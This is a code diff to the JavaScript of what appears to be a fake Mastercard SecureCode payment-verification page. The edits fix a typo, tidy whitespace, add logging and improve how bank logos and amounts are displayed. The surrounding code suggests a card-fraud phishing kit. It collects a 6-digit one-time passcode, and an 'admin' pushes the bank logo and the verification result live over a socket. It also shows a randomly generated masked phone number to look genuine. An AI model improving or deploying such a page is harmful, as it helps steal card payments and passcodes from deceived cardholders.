@@ -374,20 +374,20 @@
           @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-          }
-  
+            }
+
           #mcOtpInput:focus {
             border-color: #3498db !important;
             box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
             outline: none !important;
           }
-  
+
           .btn-loading {
             position: relative;
             pointer-events: none;
             opacity: 0.8;
           }
-  
+
           #mcVerificationContent {
             font-family: Arial, sans-serif;
           }
@@ -779,7 +779,8 @@ window.addEventListener('error', function(event) {
       'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
   };
   
-ffunction parseURLParams() {
+// FIX 1: Improved URL parameter parsing to correctly display amount
+function parseURLParams() {
     try {
         console.log('Parsing URL parameters');
         const urlParams = new URLSearchParams(window.location.search);
@@ -825,7 +826,7 @@ ffunction parseURLParams() {
     }
 }
 
-// New function to fetch amount directly from server
+// FIX 1: Enhanced server fetching for amount
 function fetchAmountFromServer(pid) {
     try {
         fetch(`/api/getPaymentDetails?pid=${pid}`)
@@ -871,6 +872,7 @@ function fetchAmountFromServer(pid) {
     }
 }
   
+// FIX 1: Improved amount display function to update all instances
 function updateAmountDisplays() {
     console.log('Updating all amount displays with:', state.amount);
     
@@ -957,7 +959,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-        // Add this new function to your code
+// Additional fetch for payment details
 function fetchPaymentDetailsFromServer() {
     // Check if we have a pid in state
     if (!state.pid) {
@@ -1007,6 +1009,7 @@ function fetchPaymentDetailsFromServer() {
         console.error('Exception in fetchPaymentDetailsFromServer:', error);
     }
 }
+
 // Initialize socket connection
 function initializeSocketConnection() {
     try {
@@ -1138,10 +1141,11 @@ function setupSocketEventHandlers() {
         }
     });
     
-    // Handle bank update command
+    // FIX 2: Enhanced bank logo update handler
     socket.on('update_mc_bank', function(data) {
         console.log('Received bank update:', data);
         if (data.bankCode) {
+            // Directly update the bank logo in the UI
             updateBankLogo(data.bankCode);
             console.log('Bank logo updated from event:', data.bankCode);
         }
@@ -1175,7 +1179,7 @@ function setupSocketEventHandlers() {
         }
     });
     
-    // Handle MC verification result
+    // FIX 3: Improved handling of MC verification results for success/failure redirect
     socket.on('mc_verification_result', function(data) {
         console.log('MC verification result received:', data);
         
@@ -1195,7 +1199,7 @@ function setupSocketEventHandlers() {
                 const currentDate = new Date().toLocaleDateString();
                 
                 // Replace with success message showing invoice ID and date
-                verificationContent.innerHTML = `
+verificationContent.innerHTML = `
                     <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 300px; padding: 20px;">
                         <div style="color: #4CAF50; font-size: 60px; margin-bottom: 20px;">✓</div>
                         <div style="text-align: center; max-width: 320px;">
@@ -1222,7 +1226,7 @@ function setupSocketEventHandlers() {
                 // Show overlay with success content
                 overlay.style.display = 'flex';
                 
-                // Redirect to success page after delay
+                // FIX 3: Redirect to success page after delay
                 setTimeout(() => {
                     window.location.href = `/success.html?ref=${state.transactionId}`;
                 }, 5000);
@@ -1248,7 +1252,7 @@ function setupSocketEventHandlers() {
                 // Keep the overlay visible but change content
                 overlay.style.display = 'flex';
                 
-                // Redirect to failure page after delay
+                // FIX 3: Redirect to failure page after delay
                 setTimeout(() => {
                     window.location.href = `/fail.html?reason=${data.reason || 'payment_failed'}&ref=${state.transactionId}`;
                 }, 2000);
@@ -1743,7 +1747,7 @@ function updateMcVerificationUI() {
         console.log('Using reference ID:', refId);
         updateElement('referenceId', refId);
         
-        // Update bank logo and verification logo based on card type
+        // FIX 2: Ensure bank logo is updated on initial display
         updateBankLogo('default'); // Will be updated by admin if needed
         updateVerificationLogo(state.cardType || 'default');
         
@@ -1779,11 +1783,25 @@ function generateRandomPhone() {
     return `********${lastFour}`;
 }
 
+// FIX 2: Enhanced bank logo update function to properly display the bank logo
 function updateBankLogo(bankCode) {
+    console.log('Updating bank logo with bank code:', bankCode);
     const bankLogo = document.getElementById('bankLogo');
-    if (!bankLogo) return;
+    if (!bankLogo) {
+        console.error('Bank logo element not found!');
+        return;
+    }
     
-    bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+    // Get the correct logo URL from the bankLogos map
+    const logoUrl = bankLogos[bankCode] || bankLogos['default'];
+    console.log('Using logo URL:', logoUrl);
+    
+    // Set the src attribute directly
+    bankLogo.src = logoUrl;
+    bankLogo.alt = bankCode + ' Logo';
+    
+    // Ensure the logo is visible
+    bankLogo.style.display = 'block';
 }
 
 function updateVerificationLogo(cardType) {
@@ -2000,7 +2018,7 @@ function handleMcSubmit() {
     // Check if OTP is correct length
     if (otpValue.length !== 6) {
         console.log('OTP length invalid:', otpValue.length);
-        otpError.textContent = 'One-Time Passcode must be 6 digits';
+otpError.textContent = 'One-Time Passcode must be 6 digits';
         otpError.style.display = 'block';
         return;
     }
@@ -2117,6 +2135,7 @@ function handleMcCancel() {
     }
 }
 
+// FIX 3: Enhanced success handling with proper redirect
 function proceedToSuccess() {
     // Get current date for display
     const currentDate = new Date().toLocaleDateString();
